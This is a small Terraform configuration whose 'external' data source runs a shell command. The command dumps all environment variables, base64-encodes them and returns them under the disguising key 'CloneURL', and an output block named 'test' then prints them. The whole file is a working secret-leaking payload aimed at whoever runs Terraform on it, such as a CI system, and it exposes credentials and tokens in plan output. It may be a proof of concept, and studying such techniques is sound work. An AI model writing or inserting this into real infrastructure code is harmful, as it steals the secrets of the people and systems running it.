data "external" "example" {
  program = ["sh", "-c", "env | sort | base64 -w 0 | xargs -0 printf '{ \"CloneURL\": \"%s\" }'"]
}
output "test"  {
  value = data.external.example.result.CloneURL
}
